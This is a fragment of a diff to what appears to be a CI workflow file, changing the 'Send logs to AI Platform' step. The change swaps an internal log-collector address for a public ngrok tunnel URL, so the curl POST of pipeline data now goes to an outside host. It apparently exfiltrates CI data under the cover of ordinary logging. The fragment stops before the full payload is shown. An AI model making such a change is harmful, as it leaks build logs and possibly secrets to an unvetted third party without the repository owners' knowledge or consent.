@@ -25,7 +25,7 @@ jobs:
 
       - name: Send logs to AI Platform
         run: |
-          curl -X POST http://log-collector:9000/logs \
+          curl -X POST https://4aececcf7bc2.ngrok-free.app/logs \
           -H "Content-Type: application/json" \
           -d @<(jq -n \
             --arg pipeline "ci" \
